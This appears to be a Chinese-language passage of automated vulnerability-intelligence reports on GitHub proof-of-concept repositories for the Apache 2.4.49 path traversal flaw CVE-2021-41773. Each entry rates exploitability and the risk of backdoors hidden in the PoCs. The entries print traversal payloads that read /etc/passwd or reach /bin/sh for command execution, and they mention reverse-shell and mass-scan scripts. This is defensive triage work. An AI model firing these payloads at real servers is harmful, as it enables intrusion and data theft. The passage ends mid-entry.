CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞。该漏洞源于 `ap_normalize_path` 函数在路径规范化处理上的缺陷，允许攻击者通过构造包含 URL 编码字符（如 `.%2e`）的恶意 URL，绕过路径遍历保护机制，访问服务器文件系统上受限目录之外的文件。

**漏洞利用方式：**

1.  **路径遍历：** 攻击者利用 `.%2e` 绕过路径规范化，构造恶意 URL 以访问任意文件。例如，`http://target/cgi-bin/.%2e/.%2e/.%2e/etc/passwd` 可以用来尝试读取 `/etc/passwd` 文件。

2.  **远程代码执行（RCE）：** 如果服务器启用了 `mod_cgi` 模块，攻击者可以通过上传恶意 CGI 脚本并利用路径遍历漏洞执行该脚本，从而实现远程代码执行。这通常需要结合服务器配置中 `cgi-bin` 目录的 `Require all granted` 指令。

**有效性：**

根据漏洞库信息和搜索结果，该漏洞已在野外被利用，POC 代码的存在进一步验证了其有效性。提供的 README.md 文件详细解释了漏洞原理和利用方法，并提供了搭建漏洞环境的步骤。

**投毒风险：**

虽然提供的 README.md 文件主要包含漏洞说明和环境搭建指导，但是依然存在一定的投毒风险。主要考虑到，如果攻击者修改了环境搭建脚本，例如在安装过程中植入后门，则可能导致受害者搭建一个包含恶意代码的 Apache 服务器。所以需要人工审核确认脚本的安全性，这里认为存在10%的投毒风险。

**总结：**

该漏洞的利用依赖于特定的 Apache 版本和服务器配置。成功利用该漏洞可能导致严重的后果，包括敏感信息泄露和远程代码执行。用户应尽快升级 Apache HTTP Server 版本以修复此漏洞。

**项目地址:** [ashique-thaha/CVE-2021-41773-POC](https://github.com/ashique-thaha/CVE-2021-41773-POC)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #21

**来源**: [CVE-2021-41773-belajarqywok_CVE-2021-41773-MSF.md](../2021/CVE-2021-41773-belajarqywok_CVE-2021-41773-MSF.md)

## CVE-2021-41773 Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行存在漏洞的Apache HTTP Server 2.4.49版本，并且Alias-like 指令配置不当，未对外部文件进行访问限制，同时开启了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 漏洞是 Apache HTTP Server 2.4.49 版本中存在的一个路径遍历漏洞。攻击者可以通过构造包含特殊字符（如`.%%32%65`）的URL，绕过服务器的路径规范化检查，从而访问到Alias-like指令配置目录以外的文件。如果目标服务器未对这些目录的文件进行访问限制（`require all denied`），攻击者就能读取敏感信息。更进一步，如果服务器允许在这些路径下执行CGI脚本，攻击者就可以实现远程代码执行。

**有效性分析：**

漏洞库信息和搜索结果均表明该漏洞已在野外被利用，PoC代码的存在也证实了其可利用性。

**利用方式分析：**

根据漏洞描述和提供的PoC代码，可以总结出以下利用方式：

1.  **路径遍历攻击：** 攻击者构造包含特殊编码的路径，例如：`/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd`尝试读取`/etc/passwd`等敏感文件。
2.  **文件读取：**  如果服务器没有对目标文件进行访问限制，攻击者可以直接读取到文件内容。
3.  **远程代码执行（RCE）：** 如果目标路径允许执行CGI脚本，攻击者可以上传恶意脚本，然后通过路径遍历漏洞执行该脚本，从而实现远程代码执行。

**投毒风险分析：**

提供的PoC代码主要包含以下文件：

*   `1.rb`：一个 Metasploit 模块，尝试通过 GET 请求访问特定 URI（`http://192.168.137.1/cgi-bin/.%%32%65/htdocs/hacklab/websekolah/upload/test.txt`）。该模块的主要目的是读取文件，没有明显的恶意行为。
*   `2.rb`：另一个 Metasploit 模块，尝试通过 GET 请求获取 PDF 文件内容 (tugas.pdf)。该模块的主要目的是读取文件，没有明显的恶意行为。
*   `Makefile`：包含 Maven 命令，用于编译和执行 Java 代码。该命令执行 `com.shell.ReverseShell` 类，并传递一些参数，包括文件名、IP 地址、路径等。**`com.shell.ReverseShell` 存在潜在的投毒风险，因为它可能包含反向 shell 或其他恶意功能。**
*   `apache_rce.rb`：Metasploit 模块，未完全贴出，但是根据文件名推测是进行远程代码执行的模块，存在一定风险。

综合来看，`Makefile` 中调用的 Java 类 `com.shell.ReverseShell` 是最可疑的部分。如果该类包含恶意代码，例如反向 shell，那么执行此 Makefile 就可能导致受害者系统被控制。其他rb文件目前主要进行get请求，风险较低。

**风险评估：**

虽然大部分代码看起来是用于漏洞利用，但是 `Makefile` 中调用的`com.shell.ReverseShell` 存在潜在风险，如果里面包含恶意代码，比如反向 shell，则有被投毒的可能。因此，存在一定的投毒风险，比例估计为10%。

**项目地址:** [belajarqywok/CVE-2021-41773-MSF](https://github.com/belajarqywok/CVE-2021-41773-MSF)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #22

**来源**: [CVE-2021-41773-blackn0te_Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution.md](../2021/CVE-2021-41773-blackn0te_Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution.md)

## CVE-2021-41773/CVE-2021-42013 - Apache HTTP Server Path Traversal and RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49 和 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，且存在可执行的CGI脚本目录

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773 和 CVE-2021-42013 是 Apache HTTP Server 2.4.49 和 2.4.50 中的路径遍历漏洞。攻击者可以利用这些漏洞，通过构造特殊的URL来访问服务器上的任意文件，如果服务器启用了CGI脚本执行，则可能导致远程代码执行。

**有效性：**
提供的PoC代码（`exploit.py`）是有效的。它包含利用路径遍历读取任意文件和利用CGI执行远程代码的payload。脚本首先检查目标服务器是否易受攻击（通过检查`Server`头），然后根据用户选择的选项执行相应的攻击。

**投毒风险：**
分析提供的PoC代码，没有发现明显的投毒代码。代码结构清晰，功能明确，主要是构造恶意请求来利用漏洞。脚本中的操作都是为了验证和利用漏洞，没有发现任何隐藏的恶意行为。
投毒风险评估：0%

**利用方式：**
1.  **路径遍历：** 攻击者通过在URL中使用经过特殊编码的路径（例如，`.%2e/%2e%2e`）来绕过服务器的路径检查，从而访问受限目录之外的文件。PoC代码中提供了两个路径遍历Payload `payload1`和`payload2`，利用 `GET` 请求读取文件内容。
2.  **远程代码执行：** 如果服务器配置允许执行CGI脚本，攻击者可以通过路径遍历访问到`bin/sh`，然后通过POST请求将命令作为数据传递给`bin/sh`执行。PoC代码中构造了包含命令的POST请求，利用`req.Session()`和`req.Request()`发送请求并接收响应，实现交互式shell。

**总结：**
该漏洞的利用需要目标服务器存在漏洞版本（2.4.49或2.4.50），并且在路径遍历访问到文件之后，如果服务器配置允许，可以进一步利用CGI执行进行远程代码执行。提供的PoC代码可以成功验证并利用该漏洞，未发现投毒风险。

**项目地址:** [blackn0te/Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution](https://github.com/blackn0te/Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #23

**来源**: [CVE-2021-41773-blu3ming_PoC-CVE-2021-41773.md](../2021/CVE-2021-41773-blu3ming_PoC-CVE-2021-41773.md)

## CVE-2021-41773 Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且受影响的Alias-like指令配置允许访问受限目录外的文件，同时CGI脚本未被禁用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的一个路径遍历漏洞。该漏洞源于Apache HTTP Server对路径规范化处理的缺陷。攻击者可以通过构造包含URL编码的路径遍历序列的恶意HTTP请求，绕过服务器的安全检查，读取服务器上任意文件，甚至可能执行任意代码。

**有效性分析：**

提供的PoC代码通过构造包含`/.%2e/%2e%2e/%2e%2e/%2e%2e/`的URL，利用Apache HTTP Server 2.4.49的路径遍历漏洞读取指定文件。PoC代码使用`urllib3`库发送HTTP请求，避免了`requests`库自动URL规范化导致的利用失败。
根据漏洞库信息、搜索引擎结果和PoC代码，可以判断该PoC代码有效。

**投毒风险分析：**

对提供的PoC代码进行分析，主要包括以下几个文件：

*   `README.md`: 描述了漏洞的详细信息、利用方法和示例。没有发现恶意代码。
*   `cve-2021-41773.py`: 漏洞利用脚本。该脚本的功能是发送包含恶意路径的HTTP请求，读取指定文件。没有发现明显的恶意代码，但存在潜在风险，即攻击者可能利用该脚本读取服务器上的敏感信息，并进行进一步的攻击。不过从代码本身来看，功能单一，不包含任何额外的后门或者恶意功能。
*   `requirements.txt`: 声明了所需的Python依赖库，包括`requests`和`urllib3`。这两个库都是常用的Python库，没有发现恶意库。

综合分析，该仓库中存在作者隐藏的投毒代码的可能性较低，但不能完全排除攻击者利用该脚本进行恶意活动的风险。

**利用方式：**

1.  **确定目标服务器：** 确定运行Apache HTTP Server 2.4.49的目标服务器。
2.  **检查配置：** 检查目标服务器的`Alias-like`指令配置，确认是否存在允许访问受限目录外的文件的配置。
3.  **构造恶意URL：** 构造包含URL编码的路径遍历序列的恶意URL，例如：`http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd`。
4.  **发送HTTP请求：** 使用PoC脚本或其他工具发送包含恶意URL的HTTP请求。
5.  **读取文件：** 如果漏洞利用成功，服务器将返回指定文件的内容。
6. **远程代码执行：** 如果CGI脚本被允许执行，攻击者可以上传一个恶意的CGI脚本并执行，从而实现远程代码执行。

**项目地址:** [blu3ming/PoC-CVE-2021-41773](https://github.com/blu3ming/PoC-CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #24

**来源**: [CVE-2021-41773-charanvoonna_CVE-2021-41773.md](../2021/CVE-2021-41773-charanvoonna_CVE-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49版本，并且配置允许CGI脚本执行

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中。该漏洞是由于对路径规范化处理的更改存在缺陷导致。攻击者可以利用路径遍历攻击将 URL 映射到 Alias 指令配置目录之外的文件。如果这些目录之外的文件没有受到默认配置 "require all denied" 的保护，则请求可能会成功。如果为这些别名路径启用了 CGI 脚本，则可能允许远程代码执行。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且已被广泛利用。提供的 Dockerfile 和 README.md 文件提供了一个可行的漏洞利用方式。

**利用方式：**
1.  **路径遍历：** 攻击者可以通过构造包含 `..` 或 URL 编码的 `..%2f` 的恶意 URL，绕过服务器的路径检查，访问受限文件。
2.  **CGI 执行：** 如果目标服务器启用了 CGI 脚本执行，攻击者可以通过路径遍历访问 CGI 脚本，并执行任意代码。

**POC 代码分析：**

*   **Dockerfile:** 该 Dockerfile 用于构建一个存在 CVE-2021-41773 漏洞的 Apache HTTP Server 2.4.49 环境。
    *   `FROM httpd:2.4.49`：指定使用 Apache HTTP Server 2.4.49 镜像作为基础镜像。
    *   `RUN sed -i 's/#LoadModule cgi_module/LoadModule cgi_module/' /usr/local/apache2/conf/httpd.conf`：启用 CGI 模块。
    *   `RUN echo ...`：配置 CGI 目录，允许执行 CGI 脚本。
    *   `RUN echo "AllowEncodedSlashes On" >> /usr/local/apache2/conf/httpd.conf`：允许 URL 中包含编码的斜杠，这是利用该漏洞的关键。
    *   `COPY test.cgi /usr/local/apache2/cgi-bin/test.cgi`：复制一个测试 CGI 脚本到 CGI 目录下。
    *   `RUN chmod +x /usr/local/apache2/cgi-bin/test.cgi`：为测试 CGI 脚本添加执行权限。
*   **README.md:** 该文件描述了 CVE-2021-41773 漏洞的细节，以及如何使用 Nmap NSE 脚本检测该漏洞。提供了 Nmap 脚本的架构、payload 设置、HTTP 请求和响应处理、输出格式和错误处理。

**投毒风险：**
提供的 Dockerfile 主要用于搭建漏洞环境以进行验证，风险极低。它本身没有包含恶意代码。
虽然 *test.cgi* 文件内容未知，这里假设 *test.cgi* 为安全的代码，否则投毒的概率会升高。
综合评估投毒风险为 1%。


**项目地址:** [charanvoonna/CVE-2021-41773](https://github.com/charanvoonna/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #25

**来源**: [CVE-2021-41773-dileepdkumar_LayarKacaSiber-CVE-2021-41773.md](../2021/CVE-2021-41773-dileepdkumar_LayarKacaSiber-CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution (RCE)

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未经身份验证的攻击者读取任意文件或执行任意代码。

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并且CGI脚本已启用。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中的一个路径遍历漏洞。该漏洞源于对路径规范化的更改，使得攻击者可以使用路径遍历攻击将URL映射到Alias-like指令配置的目录之外的文件。如果这些目录之外的文件没有受到默认配置"require all denied"的保护，请求可能会成功。如果CGI脚本对这些别名路径启用，则可能导致远程代码执行。

**利用方式：**
攻击者可以构造包含编码后的路径遍历字符（例如`.%2e`）的HTTP请求，绕过服务器的安全检查，访问服务器文件系统上的任意文件。如果服务器配置允许执行CGI脚本，攻击者可以通过上传恶意脚本并执行来实现远程代码执行。

**有效性：**
提供的PoC代码`exploit.sh`看起来是有效的。它使用`curl`命令发送包含路径遍历序列的请求，并尝试执行指定的命令。Dockerfile和httpd-path-traversal.conf文件配置了一个易受攻击的Apache服务器环境，用于测试路径遍历。

**投毒风险：**
检查提供的文件，`/tmp/59e48ccb9412bd5b9a153d1926dd8eca/README.md`，`/tmp/59e48ccb9412bd5b9a153d1926dd8eca/exploit.sh`，`/tmp/59e48ccb9412bd5b9a153d1926dd8eca/Path Traversal/Dockerfile`，`/tmp/59e48ccb9412bd5b9a153d1926dd8eca/Path Traversal/httpd-path-traversal.conf`。这些文件看起来主要用于演示和利用CVE-2021-41773漏洞。其中，`exploit.sh`脚本存在一定的风险，攻击者可以利用此脚本执行恶意命令。`httpd-path-traversal.conf` 配置，如果被攻击者修改，会导致服务器存在后门，但是从目前的代码来看，投毒风险较低。只有 `exploit.sh`存在可被利用的风险，但这不是作者主动投毒，所以投毒风险很低。

**项目地址:** [dileepdkumar/LayarKacaSiber-CVE-2021-41773](https://github.com/dileepdkumar/LayarKacaSiber-CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #26

**来源**: [CVE-2021-41773-gunzf0x_CVE-2021-41773.md](../2021/CVE-2021-41773-gunzf0x_CVE-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历和RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并启用了cgi-bin目录的执行权限

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 中。攻击者可以通过构造包含特殊编码的 URL，利用路径遍历漏洞访问受限目录之外的文件。如果服务器配置允许 CGI 脚本执行，则可以进一步利用该漏洞执行任意代码。 

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的 PoC 代码，此漏洞利用是有效的。漏洞库中提到该漏洞已在野外被利用，多个搜索结果也证实了该漏洞的存在和潜在危害，并提供了利用示例。PoC 代码实现了利用路径遍历漏洞执行命令的功能。

**投毒风险：**
PoC 代码主要功能是利用漏洞实现远程命令执行。以下是对代码可能存在的投毒风险的分析：

*   **代码结构和功能：** PoC 代码结构清晰，主要包括参数解析、URL 构造和 HTTP 请求发送等功能。这些功能都与漏洞利用直接相关。
*   **潜在的风险点：**  PoC 代码中存在一些潜在的风险点：
    *   `data_payload: str = f"echo Content-Type: text/plain; echo; {args.command}"` ，args.command参数如果被恶意构造，可能会导致执行非预期的系统命令。
        *   虽然`clean_url`函数旨在清理URL，但可能存在绕过的风险。

总体来说，代码的投毒风险较低，大概在5%。主要风险集中在命令执行的参数上，以及URL清洗函数可能存在的绕过。

**利用方式：**
1.  **确定目标：** 找到运行 Apache HTTP Server 2.4.49 的目标服务器，并确认 `cgi-bin` 目录已启用。
2.  **构造 Payload：** 使用包含路径遍历的 URL 和要执行的命令构造 HTTP POST 请求。URL 的基本格式如下：
    ```
    /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh
    ```
    其中，`.%2e` 是 `..` 的 URL 编码，用于绕过路径检查。`bin/sh` 是要执行的 shell 程序的路径。
3.  **发送请求：**  将构造好的 HTTP POST 请求发送到目标服务器。
4.  **获取结果：**  如果漏洞利用成功，服务器将执行指定的命令，并将结果作为 HTTP 响应返回。

**项目地址:** [gunzf0x/CVE-2021-41773](https://github.com/gunzf0x/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #27

**来源**: [CVE-2021-41773-hackedrishi_CTF_WRITEUPS-TryHackMe-CVE-2021-41773-.md](../2021/CVE-2021-41773-hackedrishi_CTF_WRITEUPS-TryHackMe-CVE-2021-41773-.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，且存在Alias-like指令配置不当或CGI脚本启用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的一个路径穿越漏洞。攻击者可以通过构造包含`..`的恶意URL，绕过Alias-like指令配置的目录限制，访问服务器上的任意文件。如果目标服务器启用了CGI脚本，攻击者可能进一步利用该漏洞执行远程代码。根据漏洞描述，需要特定的配置错误，例如，文件没有被"require all denied"保护。从提供的漏洞利用代码看， 该代码本身是一个 CTF 的 Writeup， 解释了漏洞原理和利用方式，本身不包含恶意代码，但可能存在作者隐藏的后门代码的风险，但是可能性极低。

**有效性：**
该漏洞利用代码(CTF Writeup) 本身不直接用于漏洞利用，而是用于解释该漏洞，根据搜索引擎结果，该漏洞真实存在且被广泛利用。

**投毒风险：**
提供的漏洞利用代码是一个CTF Writeup，主要用于讲解漏洞原理，本身不太可能包含恶意投毒代码， 但为了安全起见， 风险评估为5%。

**利用方式：**
1.  **路径穿越：** 构造包含`..`的URL，例如`/%2e%2e/%2e%2e/%2e%2e/etc/passwd`，尝试访问服务器上的敏感文件，如`/etc/passwd`。
2.  **RCE（如果CGI启用）：**如果服务器配置允许执行CGI脚本，攻击者可以通过上传恶意CGI脚本并执行它，来实现远程代码执行。 需要注意的是，通常需要结合Alias指令的配置不当才能实现。

**利用前提：**
*   Apache HTTP Server版本为2.4.49。
*   目标文件所在目录没有被`require all denied`限制。
*   （可选）服务器启用了CGI脚本，并且Alias指令配置不当。

**项目地址:** [hackedrishi/CTF_WRITEUPS-TryHackMe-CVE-2021-41773-](https://github.com/hackedrishi/CTF_WRITEUPS-TryHackMe-CVE-2021-41773-)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #28

**来源**: [CVE-2021-41773-javaamo_CVE-2021-41773.md](../2021/CVE-2021-41773-javaamo_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行存在漏洞的Apache HTTP Server 2.4.49版本，并启用了cgi-bin目录，且该目录下的文件没有被'require all denied'保护

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-41773 漏洞是 Apache HTTP Server 2.4.49 版本中存在的路径遍历漏洞。攻击者可以通过构造包含特殊字符的 URL，绕过 Alias 类似的指令配置的目录限制，访问到服务器上的任意文件。如果服务器同时启用了 CGI 脚本支持，攻击者甚至可以执行任意代码。

**有效性：**
根据漏洞描述和提供的漏洞利用代码，该漏洞利用是有效的。搜索引擎结果也表明该漏洞已被公开利用。

**投毒风险：**
提供的漏洞利用代码主要由一个shell脚本和一个README文件组成。shell脚本的功能是向目标服务器发送包含恶意路径的HTTP请求，读取指定文件或执行命令。README文件是对漏洞利用代码的说明。
脚本本身存在投毒的可能性较低，风险预估1%。主要风险点在于targets.txt文件，如果攻击者替换了targets.txt中的目标，可能会导致非授权的扫描或者攻击。需要注意的是，该PoC本身就是用于攻击的，因此不能将利用漏洞的代码判定为投毒。

**利用方式：**
1.  准备：准备一个包含目标服务器地址列表的 `targets.txt` 文件。
2.  路径遍历：使用`./50383.sh targets.txt /etc/passwd`尝试读取敏感文件，例如`/etc/passwd`。
3.  远程代码执行：如果目标服务器启用了 CGI，则可以通过类似`./50383.sh targets.txt /bin/sh whoami`的方式执行命令。
   需要注意的是，该POC代码尝试利用路径遍历漏洞，将请求发送到`/cgi-bin/`目录，从而触发CGI脚本的执行，最终达到远程代码执行的目的. 如果CGI未开启，则只能进行文件读取。

**项目地址:** [javaamo/CVE-2021-41773](https://github.com/javaamo/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #29

**来源**: [CVE-2021-41773-jkska23_Additive-Vulnerability-Analysis-CVE-2021-41773.md](../2021/CVE-2021-41773-jkska23_Additive-Vulnerability-Analysis-CVE-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历和文件泄露

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，且Alias配置存在缺陷，允许访问受限目录外的文件，并且可能开启了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

**有效性分析：**

根据漏洞库信息和搜索引擎结果，CVE-2021-41773 是 Apache HTTP Server 2.4.49 版本中存在的路径遍历漏洞，且已被公开利用。搜索引擎结果显示该漏洞允许未经验证的攻击者访问敏感信息，甚至执行任意代码。漏洞库信息也证实了这一点，并指出该漏洞允许攻击者绕过 Alias 指令配置的目录限制，访问未受 "require all denied" 保护的文件。如果目标配置允许，还可能执行 CGI 脚本。

**投毒风险分析：**

提供的“漏洞利用代码”实际上包含两个文件：README.md 和 index.html。

*   **README.md：**  只是一个简单的文本文件，描述了该漏洞和远程代码执行。
*   **index.html：** 是由 pdf2htmlEX 生成的 HTML 文件，用于显示 PDF 内容。这个HTML 文件看起来是正常的，没有任何明显的恶意代码，它的作用仅仅是将PDF转换成了HTML，并没有什么可疑的js或者链接。

因此，提供的代码仓库中**没有**发现任何明显的投毒代码。 投毒风险极低，几乎为0%的可能性

**利用方式：**

利用 CVE-2021-41773 的基本方式是通过构造包含路径遍历字符（如`..%2f`）的 URL 来访问目标服务器上的任意文件。攻击者可以尝试以下步骤：

1.  **确定目标服务器是否运行 Apache HTTP Server 2.4.49。**
2.  **尝试使用路径遍历payload访问敏感文件，例如`/../../../../etc/passwd`。** 使用URL编码来绕过一些常见的安全过滤。
3.  **如果服务器配置允许，尝试执行任意 CGI 脚本。**  这通常涉及到上传恶意脚本并使用路径遍历漏洞来访问和执行它。

**漏洞利用的关键点：**

*   **Alias配置：**  该漏洞依赖于 Apache HTTP Server 的 Alias 指令配置不当。
*   **权限控制：**  被访问的文件必须没有受到 "require all denied" 的保护。
*   **CGI支持：**  如果开启了 CGI 支持，则可能导致远程代码执行。

**项目地址:** [jkska23/Additive-Vulnerability-Analysis-CVE-2021-41773](https://github.com/jkska23/Additive-Vulnerability-Analysis-CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #30

**来源**: [CVE-2021-41773-justakazh_mass_cve-2021-41773.md](../2021/CVE-2021-41773-justakazh_mass_cve-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未经身份验证的攻击者读取任意文件和/或执行远程代码

**影响版本:** 2.4.49

**利用条件:** 目标系统运行受影响的 Apache HTTP Server 版本，并配置了Alias指令或启用了CGI脚本执行

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

根据漏洞库信息、搜索结果和提供的漏洞利用代码，CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，如果配置不当，可能导致远程代码执行。该漏洞允许攻击者通过构造包含特殊字符（如 URL 编码的 `%2e` 和 `%2e%2e`）的 URL，来访问服务器上受限目录之外的文件。

**有效性:**

根据漏洞库信息，该漏洞已在野外被利用。提供的 exploit-db 链接 (在 `mass_cve-2021-41773/README.md` 中) 也验证了这一点。提供的python脚本 `cve-2021-41773.py`  通过读取 `/etc/passwd` 文件来检测漏洞存在。另一个脚本 `cve-2021-41773_RCE.py` 尝试通过 cgi-bin 执行命令 `uname`，如果返回 `Linux` 或 `linux`，则认为存在 RCE 漏洞。

**投毒风险:**

检查提供的代码，没有发现明显的恶意或后门代码。所有的脚本都是为了验证漏洞的存在，而不是植入任何持久性的后门。`cve-2021-41773.py`  扫描目标然后保存结果, `cve-2021-41773_RCE.py`  是RCE验证脚本。`cve-2021-41773_manual.py` 允许手动指定命令执行. 因此投毒风险评估为0%。

**利用方式:**

1.  **路径遍历 (文件读取):**  攻击者发送一个精心构造的 HTTP GET 请求，其中包含经过 URL 编码的路径遍历字符，例如 `/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`。如果服务器存在漏洞且目录配置不当，服务器将返回 `/etc/passwd` 的内容。
2.  **远程代码执行 (RCE):**  如果服务器启用了 CGI 脚本执行，攻击者可以使用路径遍历来访问和执行任意脚本。`cve-2021-41773_RCE.py` 脚本通过POST请求向URL发送命令, 例如 `uname`，如果执行成功, 则判定可以RCE.  利用需要服务器配置支持 CGI 脚本，且目标路径没有 require all denied 配置。

**项目地址:** [justakazh/mass_cve-2021-41773](https://github.com/justakazh/mass_cve-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #31

**来源**: [CVE-2021-41773-khaidtraivch_CVE-2021-41773-Apache-2.4.49-.md](../2021/CVE-2021-41773-khaidtraivch_CVE-2021-41773-Apache-2.4.49-.md)

## CVE-2021-41773 Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可读取敏感文件并远程执行代码

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并且启用了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞利用具有较高的有效性。

**有效性：**

*   漏洞库明确指出该漏洞已被在野利用。
*   搜索结果显示该漏洞允许未经身份验证的攻击者读取敏感信息并执行任意代码。
*   提供的POC代码包含利用路径遍历读取`/etc/passwd`文件的脚本以及通过CGI执行反向shell的脚本，证明了漏洞的可利用性。

**投毒风险：**

虽然POC代码本身实现了明确的漏洞利用功能，但考虑到其来源的安全性无法完全保证，仍存在潜在的投毒风险。具体分析如下：

*   代码的功能相对简单直接，主要依赖于`curl`命令发送HTTP请求。潜在的投毒方式可能包括：
    *   **变量替换：** 攻击者可能尝试修改`TARGET_IP`或`ATTACKER_IP`变量，将利用流量引导至恶意服务器。
    *   **命令注入：** 攻击者可能尝试通过修改`URL`或`POST`数据中的参数，实现命令注入，从而执行恶意代码。虽然在提供的代码中直接注入恶意代码的难度较高，但仍然不能完全排除这种可能性。
    *   **依赖库问题：** 虽然POC主要依赖`curl`和`bash`，但如果运行环境存在其他未知的依赖库，可能存在通过这些依赖库进行投毒的风险。

由于代码较为简短，且功能较为直接，恶意代码隐藏的空间有限。因此，投毒风险相对较低，估计在10%左右。

**利用方式：**

该漏洞的利用方式如下：

